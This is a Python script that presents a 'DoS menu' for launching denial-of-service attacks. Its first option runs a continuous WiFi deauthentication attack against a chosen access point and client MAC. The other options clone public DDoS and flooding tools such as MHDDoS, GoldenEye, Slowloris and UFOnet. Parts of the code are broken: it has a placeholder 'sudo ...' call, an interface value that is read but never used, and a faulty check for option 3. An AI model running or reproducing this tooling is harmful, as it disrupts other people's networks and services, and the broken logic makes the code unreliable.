import sys
import os
import time
import subprocess
def clear():
    os.system("clear")

def dos_banner():
    print("""
██████╗░░█████╗░░██████╗  ███╗░░░███╗███████╗███╗░░██╗██╗░░░██╗
██╔══██╗██╔══██╗██╔════╝  ████╗░████║██╔════╝████╗░██║██║░░░██║
██║░░██║██║░░██║╚█████╗░  ██╔████╔██║█████╗░░██╔██╗██║██║░░░██║
██║░░██║██║░░██║░╚═══██╗  ██║╚██╔╝██║██╔══╝░░██║╚████║██║░░░██║
██████╔╝╚█████╔╝██████╔╝  ██║░╚═╝░██║███████╗██║░╚███║╚██████╔╝
╚═════╝░░╚════╝░╚═════╝░  ╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚══╝░╚═════╝░""")

def dos_menu():
    print("""
╔═══════════════════════════════════╗
║ 1. aireplay-ng                    ║
║ 2. GoldenEye                      ║
║ 3. MHDDos                         ║
║ 4. MikuMikuBeam                   ║
║ 5. DDoS RIPPER                    ║
║ 6. Raven-Storm                    ║
║ 7. SlowLoris                      ║
║ 8. aSYNcrone                      ║
║ 9. UFOnet                         ║
║ 99. Exit                          ║
╚═══════════════════════════════════╝ 
          """)

clear()
dos_banner()

while True:
    
    dos_choice = input("dos>> ").strip().lower()
    if dos_choice in ("h", "help"):
        dos_menu()
    
    elif dos_choice in ("1", "aireplay-ng"):
        intrfc = input("Enter your interface card>> ")
        print("Putting", intrfc, "into monitor mode...")
        subprocess.run(("sudo", "airmon-ng", "check", "kill"))
        try:
            subprocess.run(("sudo", "airodump-ng", intrfc))
        except KeyboardInterrupt:
            print("\nStopped Scanning, continue...\n")
            intrfc2 = None
            try:
                subprocess.run(("sudo", "..."))
            except KeyboardInterrupt:
                intrfc2 = input("Enter monitor-mode interface >> ")

            if not intrfc2:
                print("No interface provided, returning to menu.")
                continue

        wifimac = input("Enter WiFi's mac>> ")
        wifichannel = input("Enter WiFi's channel ID>> ")
        subprocess.run(("sudo", "airodump-ng", "--bssid", wifimac, "-c", wifichannel, "wlan0mon"))
        wifitarget = input("Enter target's mac address>> ")
        subprocess.run(("sudo", "aireplay-ng", "--deauth", "0", "-a", wifimac, "-c", wifitarget, "wlan0mon"))

    elif dos_choice in ("2", "goldeneye"):
        subprocess.run(("git", "clone", "https://github.com/jseidl/GoldenEye", "goldeneye"))
    
    elif dos_choice in ("3"):
        subprocess.run(("git", "clone", "https://github.com/MatrixTM/MHDDoS/", "mhddos"))

    elif dos_choice in ("4", "mikumikubeam"):
        subprocess.run(("git", "clone", "https://github.com/sammwyy/MikuMikuBeam", "mikubeam"))

    elif dos_choice in ("5", "ddos-ripper", "ddosripper"):
        subprocess.run(("git", "clone", "https://github.com/palahsu/DDoS-Ripper", "ddos-ripper"))

    elif dos_choice in ("6", "raven-storm", "ravenstorm"):
        subprocess.run(("git", "clone", "https://github.com/Tmpertor/Raven-Storm", "raven-storm"))

    elif dos_choice in ("7", "slowloris"):
        subprocess.run(("git", "clone", "https://github.com/gkbrk/slowloris"))

    elif dos_choice in ("8", "asyncrone"):
        subprocess.run(("git", "clone", "https://github.com/fatihsnsy/aSYNcrone", "asyncrone"))

    elif dos_choice in ("9", "ufonet"):
        subprocess.run(("git", "clone", "https://github.com/epsylon/ufonet"))
    elif dos_choice in ("99", "exit", "quit"):
        clear()
        print("Exitting :D")
        time.sleep(0.5)
        sys.exit()
    else:
        print("This command isn't on the list :D")
